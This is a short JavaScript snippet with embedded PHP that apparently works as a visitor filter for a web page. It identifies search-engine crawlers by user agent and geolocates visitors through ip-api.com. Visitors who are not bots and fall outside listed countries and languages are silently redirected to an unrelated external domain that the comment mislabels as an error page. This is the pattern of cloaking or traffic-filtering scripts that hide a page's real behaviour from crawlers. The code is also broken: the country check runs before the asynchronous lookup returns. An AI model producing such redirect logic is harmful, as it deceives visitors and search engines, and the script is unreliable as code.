// Get user's IP address
const ip_address = "<?php echo $_SERVER['REMOTE_ADDR']; ?>";

// Define array of bot user agents to filter out
const bot_user_agents = ['Googlebot', 'Bingbot', 'Yahoo! Slurp', 'DuckDuckBot'];

// Define array of allowed countries
const allowed_countries = ['PL', 'CA', 'GB', 'AU'];

// Define array of allowed languages
const allowed_languages = ['us', 'ru', 'pl', 'de'];

// Get user agent string
const user_agent = "<?php echo $_SERVER['HTTP_USER_AGENT']; ?>";

// Get user's country code based on IP address
let country_code = '';
fetch(`http://ip-api.com/json/${ip_address}?fields=status,message,countryCode`)
  .then(response => response.json())
  .then(data => country_code = data.countryCode);

// Get user's language based on browser settings
const language = navigator.language.substring(0, 2);

// Check if user agent is a bot
let is_bot = false;
for (const bot_user_agent of bot_user_agents) {
  if (user_agent.includes(bot_user_agent)) {
    is_bot = true;
    break;
  }
}

// Check if user's country is allowed
let country_allowed = false;
if (allowed_countries.includes(country_code)) {
  country_allowed = true;
}

// Check if user's language is allowed
let language_allowed = false;
if (allowed_languages.includes(language)) {
  language_allowed = true;
}

// If all filters fail, redirect user to error page
if (!is_bot && !country_allowed && !language_allowed) {
  window.location.href = 'https://l106-co.idealica-lat.com/';
}

// If any filter passes, continue with normal page content
console.log("Welcome to our website!");
